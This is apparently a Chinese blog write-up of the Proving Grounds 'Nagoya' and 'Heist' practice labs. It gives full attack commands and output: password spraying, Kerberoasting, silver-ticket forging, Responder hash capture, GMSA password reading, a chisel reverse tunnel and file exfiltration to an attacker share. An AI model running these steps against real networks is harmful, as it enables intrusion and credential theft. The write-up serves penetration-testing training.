192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Anne.Jenkins:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Brett.Naylor:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Melissa.Mitchell:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Craig.Carr:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [+] nagoya-industries.com\\Fiona.Clark:Summer2023 SMB 192.168.166.21 445 NAGOYA [+] Enumerated shares SMB 192.168.166.21 445 NAGOYA Share Permissions Remark SMB 192.168.166.21 445 NAGOYA ----- ----------- ------ SMB 192.168.166.21 445 NAGOYA ADMIN$ Remote Admin SMB 192.168.166.21 445 NAGOYA C$ Default share SMB 192.168.166.21 445 NAGOYA IPC$ READ Remote IPC SMB 192.168.166.21 445 NAGOYA NETLOGON READ Logon server share SMB 192.168.166.21 445 NAGOYA SYSVOL READ Logon server share 拿到一套有效的账户名密码：Fiona.Clark:Summer2023 登录SMB： ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ smbclient //192.168.166.21/SYSVOL -U Fiona.Clark%Summer2023 Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Sun Apr 30 14:31:25 2023 .. D 0 Sun Apr 30 14:31:25 2023 nagoya-industries.com Dr 0 Sun Apr 30 14:31:25 2023 10328063 blocks of size 4096. 4800089 blocks available 翻文件，找到一个ResetPassword目录 smb: \\\u003e ls nagoya-industries.com\\scripts\\resetpassword\\ . D 0 Sun Apr 30 16:07:07 2023 .. D 0 Sun Apr 30 16:07:07 2023 ResetPassword.exe A 5120 Mon May 1 01:04:02 2023 ResetPassword.exe.config A 189 Mon May 1 00:53:50 2023 System.IO.FileSystem.AccessControl.dll A 28552 Tue Oct 20 11:39:30 2020 System.IO.FileSystem.AccessControl.xml A 65116 Sat Oct 10 13:10:54 2020 System.Security.AccessControl.dll A 35952 Sat Oct 23 16:45:08 2021 System.Security.AccessControl.xml A 231631 Wed Oct 20 00:14:20 2021 System.Security.Permissions.dll A 30328 Wed Oct 19 09:34:02 2022 System.Security.Permissions.xml A 8987 Wed Oct 19 09:34:02 2022 System.Security.Principal.Windows.dll A 18312 Tue Oct 20 11:46:28 2020 System.Security.Principal.Windows.xml A 90968 Sat Oct 10 13:10:54 2020 10328063 blocks of size 4096. 4800089 blocks available 下载config和xml文件，没发现敏感信息。 ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:3","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"Hint-2 Foothold 2 Enumerate shares, find the binary and reverse engineer it. Make use of credentials you found. Keep in mind that one can still enumerate ACLs without actually getting a shell 经过提示需要逆向分析，于是下载exe文件到本地，进行逆向。 将SMB ResetPassword目录下的所有文件都放到Windows x86架构的机子上，使用dnSpy工具对exe文件进行逆向，发现一组硬编码服务账户密码：svc_helpdesk/U299iYRmikYTHDbPbxPoYYfa2j4x4cdg ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:4","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"Kerberoasting 获取SPN ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ impacket-GetUserSPNs nagoya-industries.com/fiona.clark:'Summer2023' -dc-ip 192.168.166.21 -debug -outputfile kerberoast.txt Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket [+] Connecting to 192.168.166.21, port 389, SSL False [+] Total of records returned 5 ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------------- ------------ ------------------------------------------------ -------------------------- -------------------------- ---------- http/nagoya.nagoya-industries.com svc_helpdesk CN=helpdesk,CN=Users,DC=nagoya-industries,DC=com 2023-04-30 15:31:06.190955 \u003cnever\u003e MSSQL/nagoya.nagoya-industries.com svc_mssql 2023-04-30 15:45:33.288595 2023-06-16 05:38:06.145798 [-] CCache file is not found. Skipping... [+] The specified path is not correct or the KRB5CCNAME environment variable is not defined [+] Trying to connect to KDC at 192.168.166.21 [+] Trying to connect to KDC at 192.168.166.21 [+] Trying to connect to KDC at 192.168.166.21 [+] Trying to connect to KDC at 192.168.166.21 解密： ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status Service1 (?) 1g 0:00:00:13 DONE (2024-02-07 17:10) 0.07189g/s 1031Kp/s 1106Kc/s 1106KC/s -xlengx-..*7¡Vamos! Use the \"--show\" option to display all of the cracked passwords reliably Session completed. 获得第二个服务账户密码：svc_mssql/Service1 ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:5","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"RPC ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ rpcclient -U nagoya-industries/svc_helpdesk 192.168.166.21 Password for [NAGOYA-INDUSTRIES\\svc_helpdesk]: rpcclient $\u003e # 枚举域用户 rpcclient $\u003e enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[svc_helpdesk] rid:[0x450] user:[Matthew.Harrison] rid:[0x452] user:[Emma.Miah] rid:[0x453] user:[Rebecca.Bell] rid:[0x454] user:[Scott.Gardner] rid:[0x455] user:[Terry.Edwards] rid:[0x456] user:[Holly.Matthews] rid:[0x457] user:[Anne.Jenkins] rid:[0x458] user:[Brett.Naylor] rid:[0x459] user:[Melissa.Mitchell] rid:[0x45a] user:[Craig.Carr] rid:[0x45b] user:[Fiona.Clark] rid:[0x45c] user:[Patrick.Martin] rid:[0x45d] user:[Kate.Watson] rid:[0x45e] user:[Kirsty.Norris] rid:[0x45f] user:[Andrea.Hayes] rid:[0x460] user:[Abigail.Hughes] rid:[0x461] user:[Melanie.Watson] rid:[0x462] user:[Frances.Ward] rid:[0x463] user:[Sylvia.King] rid:[0x464] user:[Wayne.Hartley] rid:[0x465] user:[Iain.White] rid:[0x467] user:[Joanna.Wood] rid:[0x468] user:[Bethan.Webster] rid:[0x469] user:[Elaine.Brady] rid:[0x46b] user:[Christopher.Lewis] rid:[0x46c] user:[Megan.Johnson] rid:[0x46d] user:[Damien.Chapman] rid:[0x46e] user:[Joanne.Lewis] rid:[0x46f] user:[svc_mssql] rid:[0x470] user:[svc_tpl] rid:[0x471] user:[svc_web] rid:[0x472] # 枚举域内组 rpcclient $\u003e enumdomgroups group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Admins] rid:[0x200] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Domain Controllers] rid:[0x204] group:[Schema Admins] rid:[0x206] group:[Enterprise Admins] rid:[0x207] group:[Group Policy Creator Owners] rid:[0x208] group:[Read-only Domain Controllers] rid:[0x209] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[Key Admins] rid:[0x20e] group:[Enterprise Key Admins] rid:[0x20f] group:[DnsUpdateProxy] rid:[0x44e] group:[employees] rid:[0x451] group:[helpdesk] rid:[0x466] group:[developers] rid:[0x46a] # 查询用户所属组 rpcclient $\u003e queryusergroups 0x45c group rid:[0x201] attr:[0x7] group rid:[0x451] attr:[0x7] …… rpcclient $\u003e queryusergroups 0x46c group rid:[0x201] attr:[0x7] group rid:[0x46a] attr:[0x7] group rid:[0x451] attr:[0x7] 发现用户Christopher.Lewis 有三个组：Domain Users、employees 和 developers，比其他用户多一个 developers 组，推测是开发人员。 这里没有远程管理的组，猜测 developers 组是否能远程。尝试修改 Christopher.Lewis 用户密码。svc_helpdesk 账号对christopher.lewis 具有完全控制权限，可以重置其账号 rpcclient $\u003e setuserinfo christopher.lewis 23 'Admin@123' 尝试远程登录。使用Evil-WinRM登录成功 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ evil-winrm -u christopher.lewis -p 'Admin@123' -i 192.168.166.21 Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Christopher.Lewis\\Documents\u003e ls *Evil-WinRM* PS C:\\Users\\Christopher.Lewis\\Documents\u003e whoami nagoya-ind\\christopher.lewis *Evil-WinRM* PS C:\\Users\\Christopher.Lewis\u003e type C:\\local.txt 81950a6ba1771f388080cb994a7fcb33 ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:6","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"PrivE 上传sharphound进行信息搜集 *Evil-WinRM* PS C:\\tmp\u003e upload SharpHound.exe *Evil-WinRM* PS C:\\tmp\u003e ./SharpHound.exe -c All --OutputPrefix \"Nagoya-\" *Evil-WinRM* PS C:\\tmp\u003e download Nagoya-_20240207014142_BloodHound.zip 下载过程一直失败，使用SMB进行文件传输。 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ impacket-smbserver share $(pwd) -smb2support Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed *Evil-WinRM* PS C:\\tmp\u003e copy Nagoya-_20240207014142_BloodHound.zip \\\\192.168.45.193\\share\\Nagoya-_20240207014142_BloodHound.zip 没分析出有用信息。 ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"MSSQL 考虑到有个mssql账户，查看当前端口列表，发现存在1433端口，说明有mssql服务。 *Evil-WinRM* PS C:\\tmp\u003e netstat -anop TCP Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:88 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 880 TCP 0.0.0.0:389 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:464 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:593 0.0.0.0:0 LISTENING 880 TCP 0.0.0.0:636 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 2264 TCP 0.0.0.0:3268 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:3269 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 1016 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:9389 0.0.0.0:0 LISTENING 2624 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 480 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 760 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 1008 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 1008 TCP 0.0.0.0:49670 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:49671 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:49672 0.0.0.0:0 LISTENING 2476 TCP 0.0.0.0:49677 0.0.0.0:0 LISTENING 620 TCP 0.0.0.0:49684 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:49691 0.0.0.0:0 LISTENING 2616 TCP 0.0.0.0:49710 0.0.0.0:0 LISTENING 2648 TCP 0.0.0.0:52804 0.0.0.0:0 LISTENING 2264 TCP 127.0.0.1:53 0.0.0.0:0 LISTENING 2616 TCP 127.0.0.1:389 127.0.0.1:49674 ESTABLISHED 628 TCP 127.0.0.1:389 127.0.0.1:49676 ESTABLISHED 628 TCP 127.0.0.1:389 127.0.0.1:49742 ESTABLISHED 628 TCP 127.0.0.1:49674 127.0.0.1:389 ESTABLISHED 2684 TCP 127.0.0.1:49676 127.0.0.1:389 ESTABLISHED 2684 TCP 127.0.0.1:49742 127.0.0.1:389 ESTABLISHED 2616 TCP 192.168.166.21:53 0.0.0.0:0 LISTENING 2616 TCP 192.168.166.21:139 0.0.0.0:0 LISTENING 4 TCP 192.168.166.21:389 192.168.166.21:49771 ESTABLISHED 628 TCP 192.168.166.21:389 192.168.166.21:49839 ESTABLISHED 628 TCP 192.168.166.21:389 192.168.166.21:49846 ESTABLISHED 628 TCP 192.168.166.21:445 192.168.45.193:54162 ESTABLISHED 4 TCP 192.168.166.21:5985 192.168.45.193:34646 TIME_WAIT 0 TCP 192.168.166.21:5985 192.168.45.193:34658 ESTABLISHED 4 TCP 192.168.166.21:5985 192.168.45.193:55274 TIME_WAIT 0 TCP 192.168.166.21:49771 192.168.166.21:389 ESTABLISHED 2616 TCP 192.168.166.21:49839 192.168.166.21:389 ESTABLISHED 2648 TCP 192.168.166.21:49846 192.168.166.21:389 ESTABLISHED 2648 TCP 192.168.166.21:50482 52.168.117.173:443 ESTABLISHED 3488 TCP 192.168.166.21:50490 23.77.197.149:80 SYN_SENT 3488 上传chisel 进行端口转发，将1433端口代理出来 *Evil-WinRM* PS C:\\tmp\u003e upload chisel.exe *Evil-WinRM* PS C:\\tmp\u003e cmd /c 'C:\\tmp\\chisel.exe client 192.168.45.193:8000 R:1433:127.0.0.1:1433' # kali $ chisel server -p 8000 --reverse 本地登录 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ impacket-mssqlclient svc_mssql:'Service1'@127.0.0.1 -windows-auth Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(nagoya\\SQLEXPRESS): Line 1: Changed database context to 'master'. [*] INFO(nagoya\\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (160 3232) [!] Press help for extra shell commands SQL\u003e 尝试启用xp_cmdshell失败，权限不足 SQL\u003e exec xp_cmdshell 'whoami'; [-] ERROR(nagoya\\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'. SQL\u003e EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; [-] ERROR(nagoya\\SQLEXPRESS): Line 105: User does not have permission to perform this action. [-] ERROR(nagoya\\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement. [-] ERROR(nagoya\\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option. [-] ERROR(nagoya\\SQLEXPRESS): Line 1: ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:4:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"Hint-3 Escalation Perform kerberoast, crack the password of service account for mssql. Use everything you gathered to forge a silver ticket. Elevate your privileges on mssql by impersonating to administrator using the silver ticket. ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:4:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"白银票据 因为现在已经有svc_mssql的账户密码，可以考虑通过白银票据传递，模拟高权限的管理员。 回顾白银票据的利用条件，需要如下信息： 要伪造的域用户（一般是域管理员账户）: Administrator 域名 : nagoya-industries.com 域的SID值 可利用的服务 : MSSQL 目标服务的SPN 目标服务账户的NTLM哈希 现在还需要域的SID、MSSQL服务的SPN，svc_mssql的NTLM Hash 目前已有svc_mssql的明文密码，使用https://codebeautify.org/ntlm-hash-generator 生成 NTLM Hash， 域的SID通过powershell查询 *Evil-WinRM* PS C:\\tmp\u003e Get-ADDomain AllowedDNSSuffixes : {} ChildDomains : {} ComputersContainer : CN=Computers,DC=nagoya-industries,DC=com DeletedObjectsContainer : CN=Deleted Objects,DC=nagoya-industries,DC=com DistinguishedName : DC=nagoya-industries,DC=com DNSRoot : nagoya-industries.com DomainControllersContainer : OU=Domain Controllers,DC=nagoya-industries,DC=com DomainMode : Windows2016Domain DomainSID : S-1-5-21-1969309164-1513403977-1686805993 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=nagoya-industries,DC=com Forest : nagoya-industries.com InfrastructureMaster : nagoya.nagoya-industries.com LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=nagoya-industries,DC=com} LostAndFoundContainer : CN=LostAndFound,DC=nagoya-industries,DC=com ManagedBy : Name : nagoya-industries NetBIOSName : NAGOYA-IND ObjectClass : domainDNS ObjectGUID : 1153c877-efa1-443b-b59f-c32c9286750e ParentDomain : PDCEmulator : nagoya.nagoya-industries.com PublicKeyRequiredPasswordRolling : True QuotasContainer : CN=NTDS Quotas,DC=nagoya-industries,DC=com ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {nagoya.nagoya-industries.com} RIDMaster : nagoya.nagoya-industries.com SubordinateReferences : {DC=ForestDnsZones,DC=nagoya-industries,DC=com, DC=DomainDnsZones,DC=nagoya-industries,DC=com, CN=Configuration,DC=nagoya-industries,DC=com} SystemsContainer : CN=System,DC=nagoya-industries,DC=com UsersContainer : CN=Users,DC=nagoya-industries,DC=com MSSQL服务的SPN 也用Powershell查询 *Evil-WinRM* PS C:\\tmp\u003e Get-ADUser -Filter {SamAccountName -eq \"svc_mssql\"} -Properties ServicePrincipalNames DistinguishedName : CN=svc_mssql,CN=Users,DC=nagoya-industries,DC=com Enabled : True GivenName : svc_mssql Name : svc_mssql ObjectClass : user ObjectGUID : df7dda21-173f-4a4a-88ed-70d69481b46e SamAccountName : svc_mssql ServicePrincipalNames : {MSSQL/nagoya.nagoya-industries.com} SID : S-1-5-21-1969309164-1513403977-1686805993-1136 Surname : UserPrincipalName : svc_mssql@nagoya-industries.com 最后得到所需的内容如下： NTLM Hash: E3A0168BC21CFB88B95C954A5B18F57C Domain SID: S-1-5-21-1969309164-1513403977-1686805993 Service SPN: {MSSQL/nagoya.nagoya-industries.com} 准备工作完成，那就尝试生成白银票据 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator 接下去导入票据，连接 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ export KRB5CCNAME=$PWD/Administrator.ccache ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ klist Ticket cache: FILE:/home/xavier/Desktop/OSCP/PG_Practice/Nagoya/Administrator.ccache Default principal: Administrator@NAGOYA-INDUSTRIES.COM Valid starting Expires Service principal 2024-02-07T20:20:46 2034-02-04T20:20:46 MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM renew until 2034-02-04T20:20:46 编辑 /etc/hosts 和 /etc/krb5user.conf # /etc/hosts 127.0.0.1 nagoya.nagoya-industries.com nagoya-industries.com # /etc/krb5user.conf [libdefaults] default_realm = NAGOYA-INDUSTRIES.COM kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true rdns = false dns_canonicalize_hostname = false fcc-mit-ticketflags = true [realms] NAGOYA-INDUSTRIES.COM = { kdc = nagoya.nagoya-industries.com } [domain_realm] .nagoya-industries.com = NAGOYA-INDUSTRIES.COM 连接mssql服务 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ impacket-mssqlclient -k nagoya.nagoya-industries.com Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Encryption requ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:4:3","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"Flag *Evil-WinRM* PS C:\\Users\\Christopher.Lewis\u003e type C:\\local.txt 81950a6ba1771f388080cb994a7fcb33 type C:\\Users\\Administrator\\Desktop\\proof.txt fa2dba2c7bdff500c6f6ce31dfa6037e ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"Heist 这是第21台，Windows系统，难度Hard，名称 Heist 192.168.201.165 ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["靶场"],"content":"PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.201.165 -T4 -p- [sudo] xavier 的密码： Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-06 13:24 CST Nmap scan report for 192.168.201.165 Host is up (0.18s latency). Not shown: 65520 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-06 05:25:11Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 8080/tcp open http Werkzeug httpd 2.0.1 (Python 3.9.0) 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.83 seconds ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["靶场"],"content":"InitAccess ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["靶场"],"content":"8080-Web 端口扫描发现8080的Web服务，访问后界面如下： 测试发现主要功能就是提供一个加载远程URL的作用，存在SSRF，远程文件读取，但是无法加载webshell，命令无法执行。 这时候想到还有一种利用手法，通过Responder抓取NTLM Hash ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Heist] └─$ sudo responder -I tun0 …… [+] Listening for events... [HTTP] NTLMv2 Client : 192.168.201.165 [HTTP] NTLMv2 Username : HEIST\\enox [HTTP] NTLMv2 Hash : enox::HEIST:99fdc88fbe17e2ea破解Hash ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Heist] └─$ hashcat -m 5600 -a 0 1.hash /usr/share/wordlists/rockyou.txt --force --quiet ENOX::HEIST:99fdc88fbe17e2ea:e30843cc9021ce657ce6b1beae267f2c:0101000000000000fc1c1b27c358da01cfed432caa26b82d0000000002000800430053004900430001001e00570049004e002d0031005600480034003400390041004a004700310034000400140043005300490043002e004c004f00430041004c0003003400570049004e002d0031005600480034003400390041004a004700310034002e0043005300490043002e004c004f00430041004c000500140043005300490043002e004c004f00430041004c0008003000300000000000000000000000003000002184fb7fa927c34729731c2a223ca1542bcb740a2c3c6cb8f29853e2f03c2d9c0a001000000000000000000000000000000000000900260048005400540050002f003100390032002e003100360038002e00340035002e003200320032000000000000000000:california 得到一组用户名密码：enox/california 使用这组用户名密码尝试登录，使用evil-winrm登录成功。 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Heist] └─$ evil-winrm -u enox -p california -i 192.168.201.165 Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e whoami heist\\enox *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e Get-ChildItem -Path C:\\Users\\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue Directory: C:\\Users\\enox\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2/5/2024 9:21 PM 34 local.txt *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e type C:\\Users\\enox\\Desktop\\local.txt 6d070d8770a2ef6468fab560c6f886f1 ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:3:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["靶场"],"content":"PrivE 上传winpeas进行信息收集 *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e upload winPEASany.exe *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e ./winPEASany.exe \u003e 1.txt *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e download 1.txt 上传SharpHound 进行域信息收集 *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e upload SharpHound.exe *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e ./SharpHound.exe -c all --OutputPrefix \"Heist\" *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e download Heist_20240205234135_BloodHound.zip 手动信息收集 # 用户信息和组信息 *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e net user User accounts for \\\\ ------------------------------------------------------------------------------- Administrator enox Guest krbtgt The command completed with one or more errors. *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e net group Group Accounts for \\\\ ------------------------------------------------------------------------------- *Cloneable Domain Controllers *DnsUpdateProxy *Domain Admins *Domain Computers *Domain Controllers *Domain Guests *Domain Users *Enterprise Admins *Enterprise Key Admins *Enterprise Read-only Domain Controllers *Group Policy Creator Owners *Key Admins *Protected Users *Read-only Domain Controllers *Schema Admins *Web Admins The command completed with one or more errors. 根据BloodHound信息搜集分析的结果看，Web Admins下有个SVC_Apache用户 根据到高价值目标的最短路径分析发现，SVC_APACHE是我们的下一个目标。 ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["靶场"],"content":"SVC_APACHE 根据上图注意到WebADMIN组可以检索GMSA SVC_APACHE的密码。 GMSA 的预期用途是允许某些计算机帐户检索 GMSA 的密码，然后作为 GMSA 运行本地服务。 控制授权主体的攻击者可能会滥用该特权来冒充 GMSA。 *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e net user enox User name enox Full Name Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 8/31/2021 5:09:05 AM Password expires Never Password changeable 9/1/2021 5:09:05 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 11/14/2023 9:10:55 PM Logon hours allowed All Local Group Memberships *Remote Management Use Global Group memberships *Web Admins *Domain Users The command completed successfully. 检查下当前账户enox，发现他就是Web Admins组用户，那就可以利用GMSA读取SVC_APACHE的密码。 我们使用 GMSAPasswordReader 进行利用。 *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e ./gmsapasswordreader.exe --accountname svc_apache Calculating hashes for Old Value [*] Input username : svc_apache$ [*] Input domain : HEIST.OFFSEC [*] Salt : HEIST.OFFSECsvc_apache$ [*] rc4_hmac : 83AC7FECFBF44780E3AAF5D04DD368A5 [*] aes128_cts_hmac_sha1 : 08E643C43F775FAC782EDBB04DD40541 [*] aes256_cts_hmac_sha1 : 588C2BB865E771ECAADCB48ECCF4BCBCD421BF329B0133A213C83086F1A2E3D7 [*] des_cbc_md5 : 9E340723700454E9 Calculating hashes for Current Value [*] Input username : svc_apache$ [*] Input domain : 